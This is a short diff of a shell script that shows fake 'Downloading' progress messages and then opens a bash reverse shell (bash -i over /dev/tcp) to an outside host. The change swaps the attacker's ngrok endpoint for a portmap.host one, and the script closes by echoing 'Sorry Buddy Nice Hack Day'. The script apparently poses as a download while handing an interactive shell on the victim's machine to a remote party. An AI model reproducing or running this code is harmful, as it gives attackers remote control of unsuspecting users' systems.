@@ -4,5 +4,5 @@ echo "Downloading is prgress"
 sleep 5s
 echo "Just there take a deep breath"
 sleep 1s
-bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/14594 0>&1
+bash -i >& /dev/tcp/Avausvhs-50652.portmap.host/50652 0>&1
 echo "Sorry Buddy Nice Hack Day"
